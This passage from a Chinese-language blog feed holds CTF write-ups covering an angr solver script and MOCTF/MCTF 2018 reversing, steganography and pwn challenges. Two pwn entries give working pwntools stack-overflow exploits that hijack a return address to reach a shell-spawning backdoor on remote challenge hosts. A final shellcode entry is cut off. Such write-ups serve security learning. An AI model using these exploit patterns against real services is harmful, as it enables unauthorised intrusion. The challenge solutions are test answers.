class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">print &quot;[*]start------------------------------------&quot;</span><br><span class="line">p = angr.Project(sys.argv[1])  # 建立工程初始化二进制文件</span><br><span class="line">state = p.factory.entry_state() # 获取入口点处状态</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">state.posix.files[0].read_from(1)表示从标准输入读取一个字节</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">for _ in xrange(int(sys.argv[2])):  # 对输入进行简单约束（不为回车）</span><br><span class="line">    k = state.posix.files[0].read_from(1)</span><br><span class="line">    state.se.add(k!=10)</span><br><span class="line"></span><br><span class="line">k = state.posix.files[0].read_from(1)</span><br><span class="line">state.se.add(k==10)  # 回车为结束符</span><br><span class="line"></span><br><span class="line">state.posix.files[0].seek(0)</span><br><span class="line">state.posix.files[0].length = int(sys.argv[2])+1 # 约束输入长度（大于实际长度也可）</span><br><span class="line"></span><br><span class="line">print &quot;[*]simgr start-------------------------------&quot;</span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(state)   # 初始化进程模拟器</span><br><span class="line">sm.explore(find=lambda s:&quot;correct!&quot; in s.posix.dumps(1)) # 寻找运行过程中存在 “correct！”的路径，并丢弃其他路径</span><br><span class="line">print &quot;[*]program excuted---------------------------&quot;</span><br><span class="line"></span><br><span class="line">for pp in sm.found:</span><br><span class="line">    out = pp.posix.dumps(1)   # 表示程序的输出</span><br><span class="line">    print out</span><br><span class="line">    inp = pp.posix.files[0].all_bytes()  # 取输入的变量</span><br><span class="line">    print pp.solver.eval(inp,cast_to = str)  # 利用约束求解引擎求解输入</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MOCTF-1</title>
      <link href="/2018/10/31/MOCTF-1/"/>
      <url>/2018/10/31/MOCTF-1/</url>
      
        <content type="html"><![CDATA[<h1 id="SO-EASY"><a href="#SO-EASY" class="headerlink" title="SO EASY"></a>SO EASY</h1><p>虽然程序很大，但是在main函数里直接可以看见flag。</p><h1 id="跳跳跳"><a href="#跳跳跳" class="headerlink" title="跳跳跳"></a>跳跳跳</h1><p>还是🎲游戏，千篇一律，nop掉判断就好了,最后给出的字符串base64解密得到flag。</p><h1 id="暗恋的苦恼"><a href="#暗恋的苦恼" class="headerlink" title="暗恋的苦恼"></a>暗恋的苦恼</h1><p>给了加密程序，密文，密钥，要推算出明文。</p><p>ida打开，定位到加密函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v7 = strlen(a1);</span><br><span class="line">v6 = strlen(a2);</span><br><span class="line">v4 = 0;</span><br><span class="line">v3 = operator new(0xFFu);</span><br><span class="line">for ( i = 0; i &lt; v7; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  if ( v4 == v6 )</span><br><span class="line">    v4 = 0;</span><br><span class="line">  v3[i] = sub_401005(a1[i], a2[v4++]);</span><br><span class="line">&#125;</span><br><span class="line">v3[i] = 0;</span><br><span class="line">return v3;</span><br></pre></td></tr></table></figure><p>每一位密钥对每一位明文操作，当密钥用完时从头再取。<br>sub_401005:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = toupper(a1);</span><br><span class="line">v5 = toupper(a2);</span><br><span class="line">if ( v4 == &apos; &apos; )</span><br><span class="line">  return v4;</span><br><span class="line">for ( i = 0; i &lt; v4 - 65; ++i )</span><br><span class="line">  ++v5;</span><br><span class="line">if ( v5 &gt; 90 )</span><br><span class="line">  result = v5 - 25;</span><br><span class="line">else</span><br><span class="line">  result = v5;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure><p>toupper是转换为大写。<code>v5+=v4-65</code>，然后根据v5的值决定返回值。<br>然而不知道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ( v5 &gt; 90 )</span><br><span class="line">  result = v5 - 25;</span><br><span class="line">else</span><br><span class="line">  result = v5;</span><br></pre></td></tr></table></figure><p>这一部分怎么逆好，就把两种情况都写了…结合题目中有具体意义的提示应该也不失为一种方法吧23333:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mingwen=&quot;&quot;</span><br><span class="line">miwen=&quot;QWDRILDWNTW&quot;</span><br><span class="line">miyao=&quot;ILOVEMOCTF&quot;</span><br><span class="line">for i in range(len(miwen)):</span><br><span class="line">v5=ord(miwen[i])</span><br><span class="line">v4=65+v5-ord(miyao[i%9])</span><br><span class="line">mingwen+=chr(v4)</span><br><span class="line">print mingwen</span><br><span class="line">mingwen=&quot;&quot;</span><br><span class="line">for i in range(len(miwen)):</span><br><span class="line">v5=ord(miwen[i])+25</span><br><span class="line">v4=65+v5-ord(miyao[i%9])</span><br><span class="line">mingwen+=chr(v4)</span><br><span class="line">print mingwen</span><br></pre></td></tr></table></figure><h1 id="crakeme2"><a href="#crakeme2" class="headerlink" title="crakeme2"></a>crakeme2</h1><p>简单的异或，逆运算得到一串十六进制数字，ascii得到flag。</p><p><del>you get flag ， but it … -1s？XD</del></p><h1 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy pwn"></a>easy pwn</h1><p>栈溢出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+4h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">gets(&amp;s);</span><br><span class="line">return puts(&amp;s);</span><br></pre></td></tr></table></figure><p>后门函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0804850B                 public success</span><br><span class="line">.text:0804850B success         proc near</span><br><span class="line">.text:0804850B ; __unwind &#123;</span><br><span class="line">.text:0804850B                 push    ebp</span><br><span class="line">.text:0804850C                 mov     ebp, esp</span><br><span class="line">.text:0804850E                 sub     esp, 8</span><br><span class="line">.text:08048511                 sub     esp, 0Ch</span><br><span class="line">.text:08048514                 push    offset s        ; &quot;you success gets flag&quot;</span><br><span class="line">.text:08048519                 call    _puts</span><br><span class="line">.text:0804851E                 add     esp, 10h</span><br><span class="line">.text:08048521                 sub     esp, 0Ch</span><br><span class="line">.text:08048524                 push    offset command  ; &quot;cat flag&quot;</span><br><span class="line">.text:08048529                 call    _system</span><br><span class="line">.text:0804852E                 add     esp, 10h</span><br><span class="line">.text:08048531                 nop</span><br><span class="line">.text:08048532                 leave</span><br><span class="line">.text:08048533                 retn</span><br><span class="line">.text:08048533 ; &#125; // starts at 804850B</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;139.199.177.55&quot;,10001)</span><br><span class="line">sh.recvuntil(&quot;easy?\n&quot;)</span><br><span class="line">system=0x0804850b</span><br><span class="line">payload=&apos;a&apos;*0x18+p32(0x0804850b)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MCTF2018-2</title>
      <link href="/2018/10/30/MCTF2018-2/"/>
      <url>/2018/10/30/MCTF2018-2/</url>
      
        <content type="html"><![CDATA[<h1 id="identify"><a href="#identify" class="headerlink" title="identify"></a>identify</h1><p>ida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">v17 = xmmword_402210;</span><br><span class="line">  v18 = xmmword_402200;</span><br><span class="line">  v2 = &quot;WELCOME TO MCTF\n&quot;;</span><br><span class="line">  v19 = xmmword_402220;</span><br><span class="line">  v3 = aWelcomeToMctf[0];</span><br><span class="line">  v23 = 0xF5;</span><br><span class="line">  v25 = 0;</span><br><span class="line">  v20 = xmmword_4021F0;</span><br><span class="line">  v21 = xmmword_402240;</span><br><span class="line">  v22 = xmmword_402230;</span><br><span class="line">  for ( i = 0i64; *v2; v3 = *v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    putchar(v3);</span><br><span class="line">    ++v2;</span><br><span class="line">    fflush(0);</span><br><span class="line">    Sleep(0x64u);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a2 == 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401040(&quot;~checking:&quot;);</span><br><span class="line">    sub_401080();</span><br><span class="line">    v5 = strcmp(*(const char **)(a3 + 4), &quot;Mirage&quot;);</span><br><span class="line">    if ( v5 )</span><br><span class="line">      v5 = -(v5 &lt; 0) | 1;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401040(&quot;Incorrect username\n&quot;);</span><br><span class="line">      sub_401010(&quot;fail\n&quot;);</span><br><span class="line">      system(&quot;pause&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401040(&quot;\nCorrect Username\n&quot;);</span><br><span class="line">    v6 = *(const char **)(a3 + 8);</span><br><span class="line">    v7 = 0;</span><br><span class="line">    if ( strlen(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v7 &amp; 0x80000001;</span><br><span class="line">        v8 = (v7 &amp; 0x80000001) == 0;</span><br><span class="line">        if ( (v7 &amp; 0x80000001 &amp; 0x80000000) != 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = ((_BYTE)v9 - 1) | 0xFFFFFFFE;</span><br><span class="line">          v8 = v10 == -1;</span><br><span class="line">          v9 = v10 + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( (v6[v7] ^ 0x88) != *((_DWORD *)&amp;v17 + v7) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = &quot;\nIncorrect password\n&quot;;</span><br><span class="line">            v12 = 10;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">              putchar(v12);</span><br><span class="line">              ++v11;</span><br><span class="line">              fflush(0);</span><br><span class="line">              Sleep(0x64u);</span><br><span class="line">              v12 = *v11;</span><br><span class="line">            &#125;</span><br><span class="line">            while ( *v11 );</span><br><span class="line">            sub_401010(&quot;fail\n&quot;);</span><br><span class="line">            goto LABEL_25;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else if ( v9 == 1 &amp;&amp; (v6[v7] ^ 0x66) != *((_DWORD *)&amp;v17 + v7) )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_401040(&quot;\nIncorrect password\n&quot;);</span><br><span class="line">          sub_401010(&quot;fail\n&quot;);</span><br><span class="line">          goto LABEL_25;</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v7 &lt; strlen(v6) );</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = &quot;~checking:&quot;;</span><br><span class="line">    v14 = 126;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      putchar(v14);</span><br><span class="line">      ++v13;</span><br><span class="line">      fflush(0);</span><br><span class="line">      Sleep(0x64u);</span><br><span class="line">      v14 = *v13;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( *v13 );</span><br><span class="line">    sub_401080();</span><br><span class="line">    v15 = &quot;\nCongratulations!\n&quot;;</span><br><span class="line">    v16 = 10;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      putchar(v16);</span><br><span class="line">      ++v15;</span><br><span class="line">      fflush(0);</span><br><span class="line">      Sleep(0x64u);</span><br><span class="line">      v16 = *v15;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( *v15 );</span><br><span class="line">    sub_401010(&quot;success\n&quot;);</span><br><span class="line">LABEL_25:</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401010(&quot;[ERROR] Login information missing\n&quot;);</span><br><span class="line">    sub_401010(&quot;Usage: %s &lt;username&gt; &lt;password&gt;\n&quot;, *(_DWORD *)a3);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>显然用户名是Mirage，而密码就需要进行异或运算了。</p><p>密码下标为偶数的部分异或0x88后与固定字符串相等。</p><p>密码下标为奇数的部分异或0x66后与固定字符串相等。</p><p>逆运算脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key=[0xc5,0x25,0xdc,0x20,0xf3,0x3e,0xb8,0x14,0xd7,0x57,0xfb,0x39,0xf9,0x13,0xb9,0x12,0xed,0x39,0xfb,0x57,0xe5,0x16,0xe4,0x53,0xf5]</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    if i&amp;1 == 0:</span><br><span class="line">   flag+=chr(key[i]^0x88)</span><br><span class="line">    if i&amp;1 == 1:</span><br><span class="line">        flag+=chr(key[i]^0x66)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h1 id="吃鲨鱼"><a href="#吃鲨鱼" class="headerlink" title="吃鲨鱼"></a>吃鲨鱼</h1><p>peid看了一下发现是c#，拖进dnspy：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">string text = this.textBox1.Text;</span><br><span class="line">string[] array = new string[]</span><br><span class="line">&#123;</span><br><span class="line">&quot;69691c7bdcc3ce6d5d8a1361f22d04ac&quot;,</span><br><span class="line">&quot;0d61f8370cad1d412f80b84d143e1257&quot;,</span><br><span class="line">&quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;,</span><br><span class="line">&quot;800618943025315f869e4e1f09471012&quot;,</span><br><span class="line">&quot;f95b70fdc3088560732a5ac135644506&quot;,</span><br><span class="line">&quot;4a8a08f09d37b73795649038408b5f33&quot;,</span><br><span class="line">&quot;03c7c0ace395d80182db07ae2c30f034&quot;,</span><br><span class="line">&quot;2510c39011c5be704182423e3a695e91&quot;,</span><br><span class="line">&quot;0cc175b9c0f1b6a831c399e269772661&quot;,</span><br><span class="line">&quot;4b43b0aee35624cd95b910189b3dc231&quot;,</span><br><span class="line">&quot;83878c91171338902e0fe0fb97a8c47a&quot;,</span><br><span class="line">&quot;b14a7b8059d9c055954c92674ce60032&quot;,</span><br><span class="line">&quot;6f8f57715090da2632453988d9a1501b&quot;,</span><br><span class="line">&quot;8277e0910d750195b448797616e091ad&quot;,</span><br><span class="line">&quot;e4da3b7fbbce2345d7772b0674a318d5&quot;,</span><br><span class="line">&quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot;</span><br><span class="line">&#125;;</span><br><span class="line">if (text.Length &gt; 16)</span><br><span class="line">&#123;</span><br><span class="line">this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for (int i = 0; i &lt; text.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">char[] array2 = new char[]</span><br><span class="line">&#123;</span><br><span class="line">&apos;H&apos;</span><br><span class="line">&#125;;</span><br><span class="line">array2[0] = text[i];</span><br><span class="line">string str = new string(array2);</span><br><span class="line">if (array[i].CompareTo(Form1.fivefive(str)) != 0)</span><br><span class="line">&#123;</span><br><span class="line">this.label2.Text = &quot;You are wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">this.label2.Text = &quot;You are right!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到了这里，并且发现程序中有一些地方出现了md5，把定义的array的每个字符串md5解密一下得到了flag。</p><h1 id="Math-for-kids"><a href="#Math-for-kids" class="headerlink" title="Math for kids"></a>Math for kids</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MCTF2018-1</title>
      <link href="/2018/10/27/MCTF2018-1/"/>
      <url>/2018/10/27/MCTF2018-1/</url>
      
        <content type="html"><![CDATA[<h1 id="hello-hello"><a href="#hello-hello" class="headerlink" title="hello hello"></a>hello hello</h1><p>ida打开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mov     [rbp+s2], 4Dh ; &apos;M&apos;</span><br><span class="line">mov     [rbp+var_5F], 43h ; &apos;C&apos;</span><br><span class="line">mov     [rbp+var_5E], 54h ; &apos;T&apos;</span><br><span class="line">mov     [rbp+var_5D], 46h ; &apos;F&apos;</span><br><span class="line">mov     [rbp+var_5C], 7Bh ; &apos;&#123;&apos;</span><br><span class="line">mov     [rbp+var_5B], 77h ; &apos;w&apos;</span><br><span class="line">mov     [rbp+var_5A], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_59], 31h ; &apos;1&apos;</span><br><span class="line">mov     [rbp+var_58], 63h ; &apos;c&apos;</span><br><span class="line">mov     [rbp+var_57], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_56], 6Dh ; &apos;m&apos;</span><br><span class="line">mov     [rbp+var_55], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_54], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_53], 32h ; &apos;2&apos;</span><br><span class="line">mov     [rbp+var_52], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_51], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_50], 52h ; &apos;R&apos;</span><br><span class="line">mov     [rbp+var_4F], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_4E], 76h ; &apos;v&apos;</span><br><span class="line">mov     [rbp+var_4D], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_4C], 72h ; &apos;r&apos;</span><br><span class="line">mov     [rbp+var_4B], 73h ; &apos;s&apos;</span><br><span class="line">mov     [rbp+var_4A], 65h ; &apos;e&apos;</span><br><span class="line">mov     [rbp+var_49], 5Fh ; &apos;_&apos;</span><br><span class="line">mov     [rbp+var_48], 57h ; &apos;W&apos;</span><br><span class="line">mov     [rbp+var_47], 6Fh ; &apos;o&apos;</span><br><span class="line">mov     [rbp+var_46], 72h ; &apos;r&apos;</span><br><span class="line">mov     [rbp+var_45], 31h ; &apos;1&apos;</span><br><span class="line">mov     [rbp+var_44], 64h ; &apos;d&apos;</span><br><span class="line">mov     [rbp+var_43], 7Dh ; &apos;&#125;&apos;</span><br></pre></td></tr></table></figure><h1 id="drink-coffee"><a href="#drink-coffee" class="headerlink" title="drink coffee"></a>drink coffee</h1><p>luyten打开，check函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public static boolean CHECK(final int input) &#123;</span><br><span class="line">        if (input &gt; 10000000 &amp;&amp; input &lt; 99999999) &#123;</span><br><span class="line">            int v7 = 1;</span><br><span class="line">            int v8 = 10000000;</span><br><span class="line">            int v9 = 1;</span><br><span class="line">            if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0) &#123;</span><br><span class="line">                for (int v10 = 0; v10 &lt; 4; ++v10) &#123;</span><br><span class="line">                    if (input / v7 % 10 != input / v8 % 10) &#123;</span><br><span class="line">                        v9 = 0;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    v7 *= 10;</span><br><span class="line">                    v8 /= 10;</span><br><span class="line">                &#125;</span><br><span class="line">                if (v9 != 1) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (v9 == 1) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>本来想用这几天在研究的z3求解的…可是前面两题到现在也没能解出来…这一题运行z3脚本一直卡住，没有任何提示orz。<br>只好不用z3，魔改了原代码求passwd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10000000,99999999):</span><br><span class="line">    v7 = 1</span><br><span class="line">    v8 = 10000000</span><br><span class="line">    v9 = 1</span><br><span class="line">    if (abs(i / 1000 % 100 - 80) == 3 and i % 1000 % 927 == 0):</span><br><span class="line">        for j in range(4):</span><br><span class="line">            if (i / v7 % 10 != i / v8 % 10):</span><br><span class="line">                v9 = 0</span><br><span class="line">                break</span><br><span class="line">            v7 *= 10</span><br><span class="line">            v8 /= 10</span><br><span class="line">        if (v9 == 1):</span><br><span class="line">            print i</span><br></pre></td></tr></table></figure><p>运行后打印出passwd，输入后得到flag。</p><h1 id="听说你是萌新"><a href="#听说你是萌新" class="headerlink" title="听说你是萌新"></a>听说你是萌新</h1><p>一张jpg，hexfiend打开在文件末尾得到flag。</p><h1 id="不如…"><a href="#不如…" class="headerlink" title="不如…"></a>不如…</h1><p>一张png，binwalk看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 1332 x 747, 8-bit/color RGBA, non-interlaced</span><br><span class="line">830060        0xCAA6C         End of Zip archive</span><br></pre></td></tr></table></figure><p>发现是zip结尾，搜索IEND找到png的结尾，然后把后面的zip全部copy下来保存为新文件。mac直接可以解压，但是解压出来的docx啥也看不见，开虚拟机用windows看了一下发现有密码，所以应该就是伪加密了，找到第二个PK后标记有无密码的位置，把01改为00，解压后查看docx得到flag。</p><h1 id="猜猜flag"><a href="#猜猜flag" class="headerlink" title="猜猜flag"></a>猜猜flag</h1><h1 id="走后门吗"><a href="#走后门吗" class="headerlink" title="走后门吗"></a>走后门吗</h1><p>有后门函数直接可以开shell，直接栈溢出覆盖返回地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;123.206.131.120&quot;,10001)</span><br><span class="line">backdoor_add=0x4006e0</span><br><span class="line">sh.recv()</span><br><span class="line">payload=&quot;a&quot;*0x58+p64(backdoor_add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="后门？不存在的"><a href="#后门？不存在的" class="headerlink" title="后门？不存在的"></a>后门？不存在的</h1><p>和上面一题基本差不多，不过没有后门函数了。同样的栈溢出，没开nx保护，同时会打印出存放输入的内存地址，找了个shellcode：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 